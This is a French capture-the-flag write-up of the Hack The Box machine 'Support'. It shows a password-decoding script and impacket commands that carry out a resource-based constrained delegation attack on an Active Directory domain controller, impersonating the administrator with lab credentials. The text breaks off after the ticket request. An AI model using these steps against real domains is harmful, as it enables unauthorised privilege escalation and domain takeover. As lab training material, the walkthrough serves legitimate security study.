# Support

![image.png](image.png)

« Support » est une machine Windows de niveau de difficulté « Facile » dotée d'un partage SMB autorisant l'authentification anonyme. Une fois connecté au partage, on découvre un fichier exécutable qui sert à interroger le serveur LDAP de la machine afin de répertorier les utilisateurs disponibles. Grâce à la rétro-ingénierie, à l'analyse du réseau ou à l'émulation, le mot de passe utilisé par le binaire pour se connecter au serveur LDAP est identifié et peut être utilisé pour effectuer d'autres requêtes LDAP. Un utilisateur nommé « support » est identifié dans la liste des utilisateurs, et le champ « info » contient son mot de passe, ce qui permet d'établir une connexion WinRM à la machine. Une fois sur la machine, les informations sur le domaine peuvent être recueillies via SharpHound, et BloodHound révèle que le groupe « Shared Support Accounts », dont l'utilisateur « support » est membre, dispose des privilèges « GenericAll » sur le contrôleur de domaine. Une attaque par délégation restreinte basée sur les ressources est effectuée, et un shell en tant que NT Authority\System
est obtenu.

Commencons par exporté l’addresse ip de la target comme variable d’environnement

```jsx

└─$ export target=10.129.28.97
```

### Decodage du mot de passe

Pour décodé le mot de passe j’ai utilisé le bout de code suivant :

```jsx
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc_password)

decoded = bytes([b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(data)])

print(decoded.decode())
```

## Elévation de privilèges

### Resource-Based Constrained Delegation (RBCD)

La **Resource-Based Constrained Delegation (RBCD)** est un mécanisme Kerberos où **la machine cible contrôle quelles identités sont autorisées à se faire déléguer vers elle**, en définissant les comptes autorisés dans son attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`.

pour en savoir plus → [https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

- Ajoutons un object ordinateur au domain

```jsx
┌──(hackthus💀kali)-[~/Workspace/Hackthebox/support]
└─$ impacket-addcomputer -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password123' -dc-host $target -domain-netbios DC.support.htb 'support/support:Ironside47pleasure40Watchful'
```

![image.png](image%2047.png)

- Configurer la délégation (RBCD)

```jsx
┌──(hackthus💀kali)-[~/Workspace/Hackthebox/support]
└─$ impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -dc-ip $target -action 'write' 'support/support:Ironside47pleasure40Watchful' 
```

![image.png](image%2048.png)

- Obtenir un ticket Kerberos (impersonation)

```jsx
                                                                                                                                                 
┌──(hackthus💀kali)-[~/Workspace/Hackthebox/support]
└─$ impacket-getST -spn 'cifs/DC.support.htb' -impersonate 'administrator' -dc-ip 10.129.29.4 'support/attackersystem$:Password123'
```

![image.png](image%2049.png)
